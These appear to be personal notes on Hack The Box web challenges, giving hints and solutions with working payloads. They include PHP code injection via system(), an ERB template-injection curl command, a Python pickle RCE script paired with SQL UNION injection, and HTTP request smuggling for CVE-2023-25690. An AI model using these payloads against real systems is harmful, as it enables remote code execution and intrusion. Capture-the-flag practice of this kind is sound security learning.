**01 web_lovetok:**

 - Link: https://app.hackthebox.com/challenges/lovetok
 - Hint/Solution "?format=${system(@_GET[cmd]}&cmd=ls ../"
 - Explanation: 
	1. http://178.62.11.21:30505/: This is the base URL.
    2. ?format=$_{system($_GET[1])}: This part of the URL suggests an attempt to inject code. 
   3. It looks like it's trying to use the system function in PHP to execute a command specified in the $_GET[1] parameter.
   4. &1=ls+/: The &1=ls+/ part is likely an attempt to pass the command ls+/ as the value for the $_GET[1] parameter. 
   5. This command typically lists the files and directories in a Unix/Linux system.

**02 Toxic:** cookie to base64
 - Link: https://app.hackthebox.com/challenges/toxic
 -  Hint: Cache is Encoded With Base64 and LFI to RCE via Header Injection.
 - Solution: https://dhanush-ramuk.medium.com/toxic-hackthebox-challenge-walkthrough-easy-5629d066c127
     
**03 Neonify:**
    

 - Link: https://app.hackthebox.com/challenges/neonify
 - Hint: Encode With url Encoding.
	 - <%= File.open('flag.txt').read %> # Read file
 -  Solution: 
	 - `curl 159.65.20.166:32127 \ -s -X POST -d 'neon=a %3C%25%3D%20File.open%28%27flag.txt%27%29.read%20%25%3E' | grep -Eo 'HTB{.*}'`
 -  Explanation: https://drt.sh/posts/htb-neonify/

             
   
    
**05 COP:**
    

 - Link: https://app.hackthebox.com/challenges/cop
 - Hint: No Flag value in DB, use script
```
import pickle
import base64
import os

payload = 'cp flag.txt application/static/.'

class RCE:
    def __reduce__(self):
        return os.system, (payload,)

if __name__ == '__main__':
    print(base64.urlsafe_b64encode(pickle.dumps(RCE())).decode('ascii'))
```
 - Steps:
	 - run script on local copy the <value> output and 
		add to the url like 
		target/1' UNION SELECT '<VALUE>
 - Solution: https://drt.sh/posts/htb-cop/

**06 Render Quest:**
    

 - Link: https://app.hackthebox.com/challenges/renderquest
 - Hint: Prepare A malicious Like that can have Command in it
	 1. go https://webhook.site/    	
	 2. Preaper Request with Respond Body of {{.FetchServerInfo "ls -la"}}
	 3. Modify it as you go
 - Solution: https://medium.com/@tanish.saxena26/hackthebox-renderquest-cf6c493d7b83

**07 ApacheBlaze:**
 - Link: https://app.hackthebox.com/challenges/ApacheBlaze
 - Hint: CVE-2023–25690 (https://github.com/dhmosfunk/CVE-2023-25690-POC/tree/main#internal-http-request-smuggling-via-header-injection)
```
GET /api/games/click_topia HTTP/1.1
Host: dev.apacheblaze.local


GET / HTTP/1.1
Host: localhost:1337

-----------------------------------
Reminder for encoding : 

\r\n     ->  %0d%0a
\r\n\r   ->  %0d%0a%0d
```
 - 	After Url Encoding
 - ```
   GET
   /api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/ HTTP/1.1
	Host: localhost:1337
   ```
- Solution: https://medium.com/@reinhardt.pwn/hackthebox-challenge-write-up-apacheblaze-a32643f19c45
    


